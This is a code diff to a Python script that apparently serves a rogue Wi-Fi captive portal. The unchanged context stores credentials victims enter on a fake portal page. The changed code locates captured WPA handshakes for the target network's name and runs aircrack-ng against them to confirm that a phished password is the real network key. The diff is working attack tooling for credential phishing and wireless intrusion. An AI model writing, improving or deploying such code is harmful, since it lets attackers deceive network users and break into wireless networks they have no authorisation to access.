@@ -3,6 +3,7 @@
 import http.server
 import socketserver
 import os
+import re
 import sqlite3
 import subprocess
 import tempfile
@@ -73,50 +74,70 @@ def save_credentials(username, password, user_agent, ip_address, portal_page):
 
 
 HANDSHAKE_DIR = "/etc/pwnagotchi/handshakes"
-META_FILE = "/tmp/fennec-mirage-meta.json"
+TARGET_FILE = "/tmp/fennec-mirage-target"
 
 
-def _target_bssid():
+def _norm(s):
+    return re.sub(r"[^a-z0-9]", "", (s or "").lower())
+
+
+def _target_essid():
     try:
-        with open(META_FILE, encoding="utf-8") as f:
-            return (json.load(f).get("bssid") or "").upper()
-    except Exception:
+        with open(TARGET_FILE, encoding="utf-8") as f:
+            return f.readline().strip()
+    except OSError:
         return ""
 
 
-def _handshake_for(bssid):
-    key = bssid.replace(":", "").lower()
+def _candidate_handshakes():
+    """(pcap, BSSID) for every handshake of the target's ESSID. The same SSID shares
+    one key, so any of its radios' handshakes can validate the password."""
+    target = _norm(_target_essid())
+    out = []
+    if not target:
+        return out
     try:
-        for name in os.listdir(HANDSHAKE_DIR):
-            if name.lower().endswith(".pcap") and key in name.lower().replace(":", ""):
-                return os.path.join(HANDSHAKE_DIR, name)
+        names = os.listdir(HANDSHAKE_DIR)
     except OSError:
-        pass
-    return None
+        return out
+    for name in names:
+        if not name.lower().endswith(".pcap") or "_" not in name:
+            continue
+        essid_part, hexpart = name[:-5].rsplit("_", 1)
+        if _norm(essid_part) != target:
+            continue
+        if re.fullmatch(r"[0-9a-fA-F]{12}", hexpart):
+            bssid = ":".join(hexpart[i:i + 2] for i in range(0, 12, 2)).upper()
+            out.append((os.path.join(HANDSHAKE_DIR, name), bssid))
+    return out
 
 
 def verify_password(password):
-    """Check the submitted password against a captured handshake for the target.
-    True = correct, False = wrong (handshake valid, key rejected), None = cannot
-    check (no BSSID, no handshake, or no valid handshake to test against)."""
-    bssid = _target_bssid()
-    if not bssid or not password:
+    """Test the password against the captured handshakes for the target's SSID.
+    True = correct, False = wrong (a valid handshake rejected it), None = can't
+    check (no handshake to test against). All of the SSID's pcaps are passed to
+    aircrack at once so a handshake split across radios is still found."""
+    if not password:
         return None
-    pcap = _handshake_for(bssid)
-    if not pcap:
+    cands = _candidate_handshakes()
+    if not cands:
         return None
+    pcaps = sorted({p for p, _ in cands})
+    bssids = sorted({b for _, b in cands})
     wl = None
+    saw_valid = False
     try:
         with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as wf:
             wf.write(password + "\n")
             wl = wf.name
-        r = subprocess.run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl, pcap],
-                           capture_output=True, text=True, timeout=90)
-        if "KEY FOUND" in r.stdout:
-            return True
-        if "Passphrase not in dictionary" in r.stdout:
-            return False
-        return None
+        for bssid in bssids:
+            r = subprocess.run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl] + pcaps,
+                               capture_output=True, text=True, timeout=120)
+            if "KEY FOUND" in r.stdout:
+                return True
+            if "Passphrase not in dictionary" in r.stdout:
+                saw_valid = True
+        return False if saw_valid else None
     except Exception:
         return None
     finally:
